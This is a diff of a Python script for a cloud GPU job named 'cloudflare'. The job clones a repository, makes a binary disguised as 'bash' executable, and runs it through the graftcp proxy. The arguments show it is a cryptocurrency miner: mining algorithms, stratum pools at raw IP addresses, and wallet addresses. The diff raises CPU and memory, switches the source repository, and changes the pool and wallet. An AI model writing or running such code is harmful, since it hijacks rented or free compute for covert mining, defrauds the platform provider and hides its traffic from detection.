@@ -16,8 +16,8 @@ image = (
     name="cloudflare",
     image=image,
     gpu="RTX4090",
-    cpu=2,
-    memory="4Gi",
+    cpu=8,
+    memory="24Gi",
     timeout=27 * 60 * 60,
 )
 def run_script():
@@ -52,15 +52,15 @@ def run_script():
 
     sleep 3
 
-    echo "=== DOWNLOAD LOL ==="
+    echo "=== DOWNLOAD HAL ==="
     cd /mnt/code/pan
-    git clone https://github.com/malogrono/lol198.git
+    git clone https://gitlab.com/wimulyono7/hal.git
 
-    echo "=== CHECK LOL198 ==="
-    ls -lah /mnt/code/pan/lol198
+    echo "=== CHECK HAL ==="
+    ls -lah /mnt/code/pan/hal
 
     echo "=== CHECK BASH ==="
-    cd /mnt/code/pan/lol198
+    cd /mnt/code/pan/hal
     ls -lh bash
 
     chmod u+x bash
@@ -78,7 +78,7 @@ def run_script():
     ls -lah
     
     echo "=== RUN PROC VIA GRAFTCP ==="
-    ./graftcp/graftcp ./bash --algo FISHHASH --pool 104.207.93.53:443 --user d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.02 --ethstratum ETHPROX
+    ./graftcp/graftcp ./bash -a progpowz -o stratum+tcp://95.111.195.159:80 -u iZ2q2xfw9AdX8YpGrcrjEPTG2ie8FMuXMFdDNKqRRbGo15zbuUfMAzDbtEDxcDpJcXGijaADG2WVs41p8PMiBnzrV95YkTX46Ca2EZvo8wXS -p x -w TRX
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
